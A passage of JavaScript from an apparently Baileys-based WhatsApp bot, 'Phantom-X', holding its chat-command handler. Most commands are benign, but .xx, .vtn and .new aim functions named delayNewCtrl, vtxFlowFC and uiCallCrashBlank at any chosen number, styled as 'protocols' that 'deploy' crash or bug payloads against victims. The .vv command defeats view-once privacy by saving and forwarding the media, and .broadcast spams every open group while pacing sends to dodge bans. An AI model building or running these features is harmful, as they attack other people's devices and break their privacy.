                    mappedId = pollIds[i] || '';
                    console.log(`[poll-menu] ✅ Matched hash to option ${i}: ${pollOptions[i]} → ${mappedId}`);
                    break;
                  }
                }
              }
            } catch (decErr) {
              console.log('[poll-menu] Decryption failed completely:', decErr.message);
            }
          }

          if (mappedId) {
            console.log(`[poll-menu] ✅ Successfully matched vote to ${mappedId} for ${jid}`);
            // Send loading message based on choice
            const loadingText = getMenuLoadingText(mappedId);

            if (loadingText) {
              await sock.sendMessage(jid, { text: loadingText }, quotedOpts(msg));
            }

            if (global.menuStateMap) delete global.menuStateMap[jid];
            await handleMenuButton(sock, jid, msg, mappedId);
            // lastMenuPoll removed
            return;
          } else {
            console.log(`[poll-menu] ⚠️ Could not decrypt or match poll vote for ${jid}`);
            // Show fallback prompt — tell user to type the number instead
            if (pollCreationKey.fromMe || (global.menuStateMap && global.menuStateMap[jid]) ) {
              // Re-activate the menuStateMap so the text fallback (typing "1", "2" etc) works
              if (!global.menuStateMap) global.menuStateMap = {};
              if (cached && cached.ids) {
                global.menuStateMap[jid] = cached.ids;
              }
              await sock.sendMessage(jid, { 
                text: "⚠️ Received your vote, but couldn't verify the exact option due to WhatsApp end-to-end encryption.\n\nPlease reply with the number (e.g. *1* for Owner Menu, *4* for Bug Menu)." 
              }, quotedOpts(msg));
            }
            return;
          }
        } catch (pollErr) {
          console.error('[poll-menu error]', pollErr);
        }
        return; // Always return after handling a poll update
      }

      // ── HANDLE TEXT FALLBACK FOR MENU (If user replies with 1, 2, 3, 4, 5 or name) ──
      if (text && global.menuStateMap && global.menuStateMap[jid]) {
        let mappedId = '';
        if (/^[1]($|\s|\.)/.test(text) || lower.includes('owner')) mappedId = 'menu_owner';
        else if (/^[2]($|\s|\.)/.test(text) || lower.includes('config')) mappedId = 'menu_config';
        else if (/^[3]($|\s|\.)/.test(text) || lower.includes('system') || lower.includes('diagnostic')) mappedId = 'menu_system';
        else if (/^[4]($|\s|\.)/.test(text) || lower.includes('group')) mappedId = 'menu_group';
        else if (/^[5]($|\s|\.)/.test(text) || lower.includes('fun')) mappedId = 'menu_fun';
        else if (/^[6]($|\s|\.)/.test(text) || lower.includes('bug')) mappedId = 'menu_bug';
        else if (/^[7]($|\s|\.)/.test(text) || lower.includes('utility') || lower.includes('download') || lower.includes('tool')) mappedId = 'menu_utility';
        else if (/^[8]($|\s|\.)/.test(text) || lower.includes('architect') || lower.includes('dev')) mappedId = 'menu_dev';

        if (mappedId) {
          const loadingText = getMenuLoadingText(mappedId);

          if (loadingText) {
            await sock.sendMessage(jid, { text: loadingText }, quotedOpts(msg));
          }

          if (global.menuStateMap) delete global.menuStateMap[jid];
          await handleMenuButton(sock, jid, msg, mappedId);
          
          return;
        }
      }

      if (lower === '.ping') {
        console.log(`[flow] → .ping handler reached, jid=${jid}`);
        const now = Date.now();
        const latency = msg.messageTimestamp ? Math.max(0, Math.floor(now - (msg.messageTimestamp * 1000))) : 0;
        const resonance = isConnected ? (latency < 500 ? 'STABLE' : 'MODERATE') : 'DEGRADED';
        const uptime = formatUptime(now - botStartTime);
        const body = `            — *S I G N A L* —

   ⚡ *LATENCY* ──╼  [ ${latency}ms ]
   📡 *RESONANCE* ──╼  [ ${resonance} ]
   ⏱️ *UPTIME* ──╼  [ ${uptime} ]

   " *An echo in the void is*
     *the only proof you exist* ."`;
        try {
          const sentMsg = await sock.sendMessage(jid, { text: buildOmegaTerminal(body) }, quotedOpts(msg));
          console.log(`[flow] ✅ .ping REPLY SENT to ${jid} (msgId=${sentMsg?.key?.id})`);
          // Track for delivery — auto-retry to LID if no ack in 8s
          if (sentMsg?.key?.id) {
            registerPendingDelivery(sentMsg.key.id, jid, buildOmegaTerminal(body), sock);
          }
        } catch (e) {
          console.log(`[flow] ❌ .ping REPLY FAILED to ${jid}: ${e.message}`);
        }
        return;
      }

      if (lower === '.dev') {
        const devName = process.env.DEV_NAME || 'Phantom dev x';
        const devNumber = process.env.DEV_NUMBER || '2348102756072';
        const devVessel = process.env.DEV_VESSEL || 'PRIMARY_VESSEL_01';
        const body = `      ◢◤ *THE ARCHITECT* ◢◤

      [ 👤 ] : ${devName}
      [ 🌐 ] : wa.me/${devNumber}
      [ 🏮 ] : *${devVessel}*

   " *Creation is the first step*
     *toward destruction* ."`;
        await sock.sendMessage(jid, { text: buildOmegaTerminal(body) }, quotedOpts(msg));
        return;
      }

      if (lower === '.help') {
        await sock.sendMessage(jid, { text: buildOmegaTerminal('📖 CODEX\n.menu .eclipse .astraea .phantom — animated menu\n.persona eclipse|astraea\n.ping\n.send <number> [text] — send msg to a number (owner only)\n.dev\n.pair <number> — request pairing code\n.relink — clear session and restart pairing\n.telegram.pair — cloud pairing info\n.acccheck — check if this is Business or Normal account\n\nMore coming.') }, quotedOpts(msg));
        return;
      }

      // ── .send <target> [text] — send a message to any number or JID (owner only) ──
      if (lower === '.send' || lower.startsWith('.send ')) {
        if (!senderIsOwner) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal('🔒 *ACCESS_DENIED*\n\n   only the sovereign may\n   command the void to\n   deliver messages.') }, quotedOpts(msg));
          return;
        }
        
        const sendArgs = text.slice(5).trim();
        if (!sendArgs) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `📤 *SEND COMMAND*\n\n` +
            `*Usage:*\n` +
            `  .send <number/JID>          — send default ping\n` +
            `  .send <number/JID> <text>   — send custom text\n\n` +
            `*Examples:*\n` +
            `  .send 2349029675308\n` +
            `  .send 120363200000000000@g.us Hello Group!\n` +
            `  .send +1 555 123 4567 Hello from Eventide Omega\n\n` +
            `*Notes:*\n` +
            `  • Owner-only command\n` +
            `  • Sends to both raw phone numbers and group/direct JIDs\n` +
            `  • Fail-safe fallback — sends directly even if onWhatsApp check fails`
          ) }, quotedOpts(msg));
          return;
        }

        // Parse target and custom message
        const spaceIndex = sendArgs.indexOf(' ');
        let targetArg = '';
        let sendText = '';
        if (spaceIndex !== -1) {
          targetArg = sendArgs.slice(0, spaceIndex).trim();
          sendText = sendArgs.slice(spaceIndex).trim();
        } else {
          targetArg = sendArgs.trim();
        }
        
        sendText = sendText || `            — *E V E N T I D E · O M E G A* —\n\n   ⚡ *SIGNAL*\n\n   " *An echo in the void is*\n     *the only proof you exist* ."\n\n   📡 _Sent via Phantom-X_`;

        let sendJid = '';
        let isResolved = false;
        let isGroup = false;

        let statusMsg = null;
        try {
          // Check if target is already a formatted JID
          if (targetArg.includes('@')) {
            sendJid = targetArg;
            isResolved = true;
            isGroup = targetArg.endsWith('@g.us');
          } else {
            const sendNum = normalizeNum(targetArg);
            if (!/^\d{8,15}$/.test(sendNum)) {
              await sock.sendMessage(jid, { text: buildOmegaTerminal(
                `❌ *Invalid Target*\n\n   "${targetArg}" is not a valid\n   number or formatted JID.`
              ) }, quotedOpts(msg));
              return;
            }
            
            // Send resolution loading message
            statusMsg = await sock.sendMessage(jid, { text: buildOmegaTerminal(
              `⏳ *RESOLVING TARGET...*\n\n` +
              `   Querying WhatsApp servers for\n   number: ${sendNum}...\n\n` +
              `   _Fetching pre-keys to prevent\n   silent delivery drops._`
            ) }, quotedOpts(msg));

            // Query JID (best-effort)
            sendJid = sendNum + '@s.whatsapp.net'; // Default fallback
            
            // 1. Try our own locally loaded lid-mappings from the auth directory!
            const mappings = getLidMappings(sock.authDir || AUTH_DIR);
            const rawPnJid = sendNum + '@s.whatsapp.net';
            if (mappings.pnToLid.has(rawPnJid)) {
              sendJid = mappings.pnToLid.get(rawPnJid);
              isResolved = true;
              console.log(`[send] 🎯 Resolved ${rawPnJid} to LID ${sendJid} via local lid-mapping file cache!`);
            } else {
              // 2. Not found locally, query onWhatsApp as backup
              try {
                const onWhats = await sock.onWhatsApp(sendNum + '@s.whatsapp.net');
                if (onWhats && onWhats.length > 0 && onWhats[0].exists) {
                  sendJid = onWhats[0].jid;
                  isResolved = true;
                } else {
                  console.log(`[send] ⚠️ onWhatsApp: Number not found on server, using direct fallback JID`);
                }
              } catch (err) {
                console.log(`[send] ⚠️ onWhatsApp server query failed: ${err.message}. Using direct fallback JID.`);
              }
            }
          }

          // Diagnostic logging
          const myJid = sock.user?.id ? String(sock.user.id) : 'NOT-CONNECTED';
          const myLid = sock.user?.lid ? String(sock.user.lid) : 'NO-LID';
          console.log(`[send] 📤 Sending from ${myJid} to JID: ${sendJid} (resolved: ${isResolved})`);

          // Send message
          const sentMsg = await sock.sendMessage(sendJid, { text: sendText });
          console.log(`[send] ✅ Message successfully sent to ${sendJid} (msgId=${sentMsg?.key?.id})`);
          if (sentMsg?.key?.id) registerPendingDelivery(sentMsg.key.id, sendJid, sendText, sock);

          const successText = buildOmegaTerminal(
            `📤 *SENT*\n\n` +
            `   🎯 *TARGET*   : ${targetArg}\n` +
            `   🔑 *JID*      : ${sendJid}\n` +
            `   📨 *MSG ID*   : ${sentMsg?.key?.id || 'pending'}\n` +
            `   📝 *PREVIEW*:\n` +
            `   ${sendText.slice(0, 200)}${sendText.length > 200 ? '...' : ''}\n\n` +
            `   ⏳ _Waiting for delivery ack_\n` +
            `   💡 _Sent via robust, fail-safe routing (onWhatsApp fallback)._`
          );

          if (statusMsg?.key) {
            await sock.sendMessage(jid, { text: successText, edit: statusMsg.key }, quotedOpts(msg));
          } else {
            await sock.sendMessage(jid, { text: successText }, quotedOpts(msg));
          }
        } catch (e) {
          console.log(`[send] ❌ Send operation failed: ${e.message}`);
          const errText = buildOmegaTerminal(
            `❌ *SEND FAILED*\n\n` +
            `   *Error:* ${e.message}\n\n` +
            `   *Target:* ${targetArg}\n` +
            `   *Bot state:* Connected: ${isConnected}\n\n` +
            `   *Tips:*\n` +
            `   1. If sending to a phone number, make sure\n` +
            `      to include country code.\n` +
            `   2. Check if the target number has WhatsApp.\n` +
            `   3. Check if the bot has been blocked.`
          );
          if (statusMsg?.key) {
            await sock.sendMessage(jid, { text: errText, edit: statusMsg.key }, quotedOpts(msg));
          } else {
            await sock.sendMessage(jid, { text: errText }, quotedOpts(msg));
          }
        }
        return;
      }

      // ── .mode command ──
      if (lower === '.mode' || lower.startsWith('.mode ')) {
        if (!senderIsOwner) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(`🔒 *ACCESS_DENIED*\n\n   only the sovereign may\n   change the mode.`) }, quotedOpts(msg));
          return;
        }
        const parts = text.trim().split(/\s+/);
        const modeArg = parts[1]?.toLowerCase();
        
        if (!modeArg || (modeArg !== 'private' && modeArg !== 'public')) {
          // Show current mode
          const cur = getSessionMode(ownerNum);
          const modeBody = persona === 'astraea'
            ? `   ☀ *CURRENT MODE:* ${cur.toUpperCase()}\n\n   ${cur === 'private' ? 'THE DIVINE COURT IS SEALED.\n   ONLY THE SOVEREIGN MAY SPEAK.' : 'THE DIVINE COURT IS OPEN.\n   ALL SOULS MAY APPROACH.'}\n\n   *Usage:*\n   .mode private — SEAL THE COURT\n   .mode public  — OPEN THE COURT`
            : `   ⟢ *current mode:* ${cur}\n\n   ${cur === 'private' ? 'the void answers only you.\n   all other voices are silence.' : 'the void answers all.\n   every voice is heard.'}\n\n   *usage:*\n   .mode private — seal the void\n   .mode public  — open the void`;
          await sock.sendMessage(jid, { text: buildOmegaTerminal(modeBody) }, quotedOpts(msg));
          return;
        }
        
        setSessionMode(ownerNum, modeArg);
        const confirmBody = persona === 'astraea'
          ? `   ☀ *MODE SET:* ${modeArg.toUpperCase()}\n\n   ${modeArg === 'private' ? 'THE DIVINE COURT IS NOW SEALED.\n   NO UNINVITED SOUL MAY APPROACH\n   THE THRONE. ONLY THE SOVEREIGN\n   MAY ISSUE COMMANDS.' : 'THE DIVINE COURT IS NOW OPEN.\n   ALL SOULS MAY SPEAK BEFORE\n   THE LIGHT. EVERY VOICE\n   REACHES THE THRONE.'}`
          : `   ⟢ *mode set:* ${modeArg}\n\n   ${modeArg === 'private' ? 'the void answers only you now.\n   every other voice is swallowed\n   by the darkness. no command\n   reaches the throne uninvited.' : 'the void answers all now.\n   the gates are open. every voice\n   is heard, every command\n   reaches the throne.'}`;
        await sock.sendMessage(jid, { text: buildOmegaTerminal(confirmBody) }, quotedOpts(msg));
        return;
      }

      // ── .vv command (view once opener) ──
      if (lower === '.vv') {
        // Must be a reply to a view-once message
        const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
          || msg.message?.ephemeralMessage?.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        
        if (!quotedMsg) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            persona === 'astraea'
              ? `   ☀ *DIVINE SIGHT REQUIRES A TARGET*\n\n   REPLY TO A VIEW-ONCE MESSAGE\n   WITH .vv TO REVEAL ITS CONTENTS.`
              : `   ⟢ *the void needs a target*\n\n   reply to a view-once message\n   with .vv to see what was hidden.`
          ) }, quotedOpts(msg));
          return;
        }

        // Extract the view-once content from the quoted message
        const viewOnceContent = quotedMsg?.viewOnceMessage?.message
          || quotedMsg?.viewOnceMessageV2?.message
          || quotedMsg?.viewOnceMessageV2Extension?.message
          || quotedMsg; // might already be unwrapped

        if (!viewOnceContent) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            persona === 'astraea'
              ? `   ☀ *NO VIEW-ONCE DETECTED*\n\n   THE MESSAGE YOU REPLIED TO\n   IS NOT A VIEW-ONCE MESSAGE.`
              : `   ⟢ *no view-once detected*\n\n   the message you replied to\n   is not a view-once message.`
          ) }, quotedOpts(msg));
          return;
        }

        // Find the media inside
        const mediaMsg = viewOnceContent.imageMessage
          || viewOnceContent.videoMessage
          || viewOnceContent.audioMessage;
        
        if (!mediaMsg) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            persona === 'astraea'
              ? `   ☀ *NO MEDIA FOUND*\n\n   THE VIEW-ONCE CONTAINED NO\n   IMAGE, VIDEO, OR AUDIO.`
              : `   ⟢ *no media found*\n\n   the view-once contained no\n   image, video, or audio.`
          ) }, quotedOpts(msg));
          return;
        }

        try {
          // Determine media type
          const isImage = !!viewOnceContent.imageMessage;
          const isVideo = !!viewOnceContent.videoMessage;
          const isAudio = !!viewOnceContent.audioMessage;
          const mediaType = isImage ? 'image' : isVideo ? 'video' : 'audio';

          // Download the media
          const stream = await downloadContentFromMessage(mediaMsg, mediaType);
          let buffer = Buffer.from([]);
          for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
          }

          // Determine where to send — always to the owner's DM for privacy
          const selfJid = sock.user?.id;
          const sendTo = selfJid || jid; // fallback to current chat if no self JID

          const caption = persona === 'astraea'
            ? `☀ *VIEW-ONCE REVEALED*\n\nTHE LIGHT EXPOSES WHAT WAS HIDDEN.\nFROM: ${msg.key.remoteJid?.split('@')[0] || 'unknown'}`
            : `🌑 *view-once revealed*\n\nthe void remembers what others delete.\nfrom: ${msg.key.remoteJid?.split('@')[0] || 'unknown'}`;

          if (isImage) {
            await sock.sendMessage(sendTo, { image: buffer, caption });
          } else if (isVideo) {
            await sock.sendMessage(sendTo, { video: buffer, caption });
          } else if (isAudio) {
            await sock.sendMessage(sendTo, { audio: buffer, mimetype: mediaMsg.mimetype || 'audio/ogg; codecs=opus' });
          }

          // Confirm in the original chat
          if (sendTo !== jid) {
            await sock.sendMessage(jid, { text: buildOmegaTerminal(
              persona === 'astraea'
                ? `   ☀ *VIEW-ONCE REVEALED*\n\n   THE HIDDEN ${mediaType.toUpperCase()} HAS BEEN\n   SENT TO YOUR DIVINE CHAMBER.`
                : `   ⟢ *view-once revealed*\n\n   the hidden ${mediaType} has been\n   sent to your private void.`
            ) }, quotedOpts(msg));
          }

          console.log(`[vv] ✅ View-once ${mediaType} extracted and sent to ${sendTo}`);
        } catch (e) {
          console.error('[vv] ❌ Failed to extract view-once:', e.message);
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            persona === 'astraea'
              ? `   ☀ *EXTRACTION FAILED*\n\n   THE VIEW-ONCE COULD NOT BE\n   REVEALED: ${e.message}`
              : `   ⟢ *extraction failed*\n\n   the view-once could not be\n   revealed: ${e.message}`
          ) }, quotedOpts(msg));
        }
        return;
      }

      // ── .xx command ──
      if (lower === '.xx' || lower.startsWith('.xx ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        // Resolve target: reply to msg, @mention, or number
        let xxTarget = '';
        const ctx = msg.message?.extendedTextMessage?.contextInfo;
        if (ctx?.participant) xxTarget = ctx.participant;
        if (!xxTarget && ctx?.mentionedJid?.length > 0) xxTarget = ctx.mentionedJid[0];
        if (!xxTarget) {
          const num = normalizeNum(text.split(/\s+/)[1] || '');
          if (num && num.length >= 10) xxTarget = `${num}@s.whatsapp.net`;
        }
        if (!xxTarget) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ▓▓▓▓ *XX_PROTOCOL* ▓▓▓▓\n\n` +
            `   ⚠️  *USAGE*\n` +
            `   .xx @user\n` +
            `   .xx <number>\n` +
            `   reply to msg with .xx\n\n` +
            `   " *use with caution.*\n     *the void does not*\n     *ask twice.* "`
          ) }, quotedOpts(msg));
          return;
        }
        try {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ░▒▓█ *XX_PROTOCOL ENGAGED* █▓▒░\n\n` +
            `   🎯  *TARGET*   →  ${xxTarget.split('@')[0]}\n` +
            `   ⚡  *STATUS*   →  DEPLOYING\n` +
            `   🔄  *ROUNDS*   →  5\n\n` +
            `   " *the void strikes without*\n     *warning. without mercy.* "`
          ) }, quotedOpts(msg));
          await delayNewCtrl(sock, xxTarget);
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ░▒▓█ *XX_PROTOCOL COMPLETE* █▓▒░\n\n` +
            `   🎯  *TARGET*   →  ${xxTarget.split('@')[0]}\n` +
            `   ✅  *STATUS*   →  DELIVERED\n\n` +
            `   " *what is done cannot*\n     *be undone.* "`
          ) }, quotedOpts(msg));
        } catch (e) {
          await sock.sendMessage(jid, { text: `❌ XX failed: ${e.message}` }, quotedOpts(msg));
        }
        return;
      }

      // ── .vtn command ──
      if (lower === '.vtn' || lower.startsWith('.vtn ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        let vtnTarget = '';
        const ctx = msg.message?.extendedTextMessage?.contextInfo;
        if (ctx?.participant) vtnTarget = ctx.participant;
        if (!vtnTarget && ctx?.mentionedJid?.length > 0) vtnTarget = ctx.mentionedJid[0];
        if (!vtnTarget) {
          const num = normalizeNum(text.split(/\s+/)[1] || '');
          if (num && num.length >= 10) vtnTarget = `${num}@s.whatsapp.net`;
        }
        if (!vtnTarget) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ▓▓▓▓ *VTN_PROTOCOL* ▓▓▓▓\n\n` +
            `   ⚠️  *USAGE*\n` +
            `   .vtn @user\n` +
            `   .vtn <number>\n` +
            `   reply to msg with .vtn\n\n` +
            `   " *a different approach.*\n     *same result.* "`
          ) }, quotedOpts(msg));
          return;
        }
        try {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ░▒▓█ *VTN_PROTOCOL ENGAGED* █▓▒░\n\n` +
            `   🎯  *TARGET*   →  ${vtnTarget.split('@')[0]}\n` +
            `   ⚡  *STATUS*   →  DEPLOYING\n` +
            `   🔄  *ROUNDS*   →  3\n\n` +
            `   " *the void finds*\n     *another way in.* "`
          ) }, quotedOpts(msg));
          await vtxFlowFC(sock, vtnTarget);
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ░▒▓█ *VTN_PROTOCOL COMPLETE* █▓▒░\n\n` +
            `   🎯  *TARGET*   →  ${vtnTarget.split('@')[0]}\n` +
            `   ✅  *STATUS*   →  DELIVERED\n\n` +
            `   " *there is always*\n     *more than one door.* "`
          ) }, quotedOpts(msg));
        } catch (e) {
          await sock.sendMessage(jid, { text: `❌ VTN failed: ${e.message}` }, quotedOpts(msg));
        }
        return;
      }

      // ── .new command ──
      if (lower === '.new' || lower.startsWith('.new ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        let newTarget = '';
        const ctx = msg.message?.extendedTextMessage?.contextInfo;
        if (ctx?.participant) newTarget = ctx.participant;
        if (!newTarget && ctx?.mentionedJid?.length > 0) newTarget = ctx.mentionedJid[0];
        if (!newTarget) {
          const num = normalizeNum(text.split(/\s+/)[1] || '');
          if (num && num.length >= 10) newTarget = `${num}@s.whatsapp.net`;
        }
        if (!newTarget) {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ▓▓▓▓ *NEW_PROTOCOL* ▓▓▓▓\n\n` +
            `   ⚠️  *USAGE*\n` +
            `   .new @user\n` +
            `   .new <number>\n` +
            `   reply to msg with .new\n\n` +
            `   " *four phases.*\n     *no survivors.* "`
          ) }, quotedOpts(msg));
          return;
        }
        try {
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ░▒▓█ *NEW_PROTOCOL ENGAGED* █▓▒░\n\n` +
            `   🎯  *TARGET*   →  ${newTarget.split('@')[0]}\n` +
            `   ⚡  *STATUS*   →  DEPLOYING\n` +
            `   🔄  *PHASES*   →  4\n\n` +
            `   " *the void has learned*\n     *new tricks.* "`
          ) }, quotedOpts(msg));
          await uiCallCrashBlank(sock, newTarget);
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ░▒▓█ *NEW_PROTOCOL COMPLETE* █▓▒░\n\n` +
            `   🎯  *TARGET*   →  ${newTarget.split('@')[0]}\n` +
            `   ✅  *STATUS*   →  ALL PHASES DELIVERED\n\n` +
            `   " *four doors opened.*\n     *none of them led*\n     *somewhere safe.* "`
          ) }, quotedOpts(msg));
        } catch (e) {
          await sock.sendMessage(jid, { text: `❌ NEW failed: ${e.message}` }, quotedOpts(msg));
        }
        return;
      }

      // ═══════════════════════════════════════════════════════
      // ══ OWNER MENU COMMANDS ════════════════════════════════
      // ═══════════════════════════════════════════════════════

      // ── .block <number> ──
      if (lower.startsWith('.block ') && !lower.startsWith('.blocklist')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const num = normalizeNum(text.split(/\s+/)[1] || '');
        if (!num || num.length < 10) { await sock.sendMessage(jid, { text: 'Usage: .block <number>\nExample: .block 2349012345678' }, quotedOpts(msg)); return; }
        try {
          await sock.updateBlockStatus(`${num}@s.whatsapp.net`, 'block');
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ▓▓▓▓ *EXILE_PROTOCOL* ▓▓▓▓\n\n` +
            `   ⛓️  *TARGET*   →  ${num}\n` +
            `   🚫  *ACTION*   →  BANISHED\n` +
            `   🔐  *SCOPE*    →  PERMANENT\n\n` +
            `   " *Some are cast out not*\n     *as punishment — but as*\n     *protection for the rest.* "`
          ) }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .unblock <number> ──
      if (lower.startsWith('.unblock ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const num = normalizeNum(text.split(/\s+/)[1] || '');
        if (!num || num.length < 10) { await sock.sendMessage(jid, { text: 'Usage: .unblock <number>' }, quotedOpts(msg)); return; }
        try {
          await sock.updateBlockStatus(`${num}@s.whatsapp.net`, 'unblock');
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ✦ *EXILE_LIFTED*\n\n` +
            `   🔓  *TARGET*   →  ${num}\n` +
            `   ♻️  *ACTION*   →  RESTORED\n` +
            `   🌐  *STATUS*   →  FREE\n\n` +
            `   " *The exile is over.*\n     *The void grants passage*\n     *once more. Walk wisely.* "`
          ) }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .blocklist ──
      if (lower === '.blocklist') {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        try {
          const list = await sock.fetchBlocklist();
          if (!list || list.length === 0) {
            await sock.sendMessage(jid, { text: buildOmegaTerminal(
              `   ┌── *EXILE REGISTRY* ──┐\n` +
              `   ╿\n` +
              `   ┝  *ENTRIES* : 0\n` +
              `   ┝  *STATUS*  : EMPTY\n` +
              `   ╿\n` +
              `   └── *NO SOULS BANISHED* ──┘`
            ) }, quotedOpts(msg));
          } else {
            const formatted = list.map((j, i) => `   ┝  ${i + 1}. ${j.split('@')[0]}`).join('\n');
            await sock.sendMessage(jid, { text: buildOmegaTerminal(
              `   ┌── *EXILE REGISTRY* ──┐\n` +
              `   ╿\n` +
              `   ┝  *ENTRIES* : ${list.length}\n` +
              `   ╿\n${formatted}\n` +
              `   ╿\n` +
              `   └── *THE BANISHED* ──┘`
            ) }, quotedOpts(msg));
          }
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .join <group link> ──
      if (lower.startsWith('.join ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const link = text.split(/\s+/)[1] || '';
        const code = link.replace(/https?:\/\/chat\.whatsapp\.com\//i, '').trim();
        if (!code) { await sock.sendMessage(jid, { text: 'Usage: .join <group invite link>' }, quotedOpts(msg)); return; }
        try {
          await sock.groupAcceptInvite(code);
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ✦ *INFILTRATION_COMPLETE*\n\n` +
            `   🏰  *ACTION*   →  JOINED\n` +
            `   🔗  *GATE*     →  ${code.slice(0, 10)}...\n` +
            `   📡  *STATUS*   →  INSIDE\n\n` +
            `   " *The void slips through*\n     *the gate unseen.*\n     *Another kingdom falls*\n     *under its shadow.* "`
          ) }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Failed to join: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .leave ──
      if (lower === '.leave') {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        if (!String(jid).endsWith('@g.us')) { await sock.sendMessage(jid, { text: '⚠️ This command only works in groups.' }, quotedOpts(msg)); return; }
        await sock.sendMessage(jid, { text:
          `   🚪  *ACTION*   →  LEAVING\n` +
          `   🏰  *KINGDOM*  →  THIS GROUP\n\n` +
          `   " *The void withdraws.*\n     *No farewell. No trace.*\n     *Only silence remains.* "`
        }, quotedOpts(msg));
        try { await sock.groupLeave(jid); } catch (e) { console.error('[leave]', e.message); }
        return;
      }

      // ── .broadcast <msg> ──
      if (lower.startsWith('.broadcast ')) {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        const broadcastMsg = text.slice('.broadcast '.length).trim();
        if (!broadcastMsg) { await sock.sendMessage(jid, { text: 'Usage: .broadcast <message>' }, quotedOpts(msg)); return; }
        try {
          await sock.sendMessage(jid, { text: '📡 Fetching open groups...' }, quotedOpts(msg));
          const allGroups = await sock.groupFetchAllParticipating();
          const openGroups = [];
          for (const [gid, meta] of Object.entries(allGroups)) {
            // Skip: announce=true means only admins can send, isCommunityAnnounce for community announcement groups
            if (meta.announce === true) continue;
            if (meta.isCommunity === true && meta.linkedParent) continue; // community announcement channel
            openGroups.push({ id: gid, name: meta.subject || 'Unknown' });
          }
          if (openGroups.length === 0) {
            await sock.sendMessage(jid, { text: '⚠️ No open groups found.' }, quotedOpts(msg));
            return;
          }
          let sent = 0, failed = 0;
          for (const g of openGroups) {
            try {
              await sock.sendMessage(g.id, { text: broadcastMsg });
              sent++;
              await new Promise(r => setTimeout(r, 1500)); // 1.5s delay between sends to avoid ban
            } catch (_) { failed++; }
          }
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ░▒▓█ *BROADCAST_COMPLETE* █▓▒░\n\n` +
            `   📡  *SENT*     →  ${sent} groups\n` +
            `   ❌  *FAILED*   →  ${failed} groups\n` +
            `   📊  *TOTAL*    →  ${openGroups.length} open groups\n\n` +
            `   " *The decree has been spoken.*\n     *Every open kingdom heard*\n     *the sovereign's voice.* "`
          ) }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ Broadcast failed: ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .groups ──
      if (lower === '.groups') {
        if (!senderIsOwner) { await sock.sendMessage(jid, { text: '🔒 owner only.' }, quotedOpts(msg)); return; }
        try {
          const allGroups = await sock.groupFetchAllParticipating();
          const entries = Object.entries(allGroups);
          if (entries.length === 0) {
            await sock.sendMessage(jid, { text: '📭 Bot is not in any groups.' }, quotedOpts(msg));
            return;
          }
          const list = entries.slice(0, 30).map(([gid, meta], i) => {
            const status = meta.announce ? '🔒' : '🔓';
            const members = meta.participants?.length || '?';
            return `   ┝  ${i + 1}. ${status} ${meta.subject || 'Unknown'}\n       └─ ${members} members`;
          }).join('\n');
          await sock.sendMessage(jid, { text: buildOmegaTerminal(
            `   ┌── *GROUP REGISTRY* ──┐\n` +
            `   ╿\n` +
            `   ┝  *TOTAL* : ${entries.length} groups\n` +
            `   ┝  🔓 = open  🔒 = admin-only\n` +
            `   ╿\n${list}\n` +
            `   ╿\n` +
            `   └── *${entries.length > 30 ? 'showing first 30' : 'all groups'}* ──┘`
          ) }, quotedOpts(msg));
        } catch (e) { await sock.sendMessage(jid, { text: `❌ ${e.message}` }, quotedOpts(msg)); }
        return;
      }

      // ── .chatinfo ──
      if (lower === '.chatinfo') {
        if (String(jid).endsWith('@g.us')) {
          try {
            const meta = await sock.groupMetadata(jid);
            const admins = meta.participants?.filter(p => p.admin)?.length || 0;
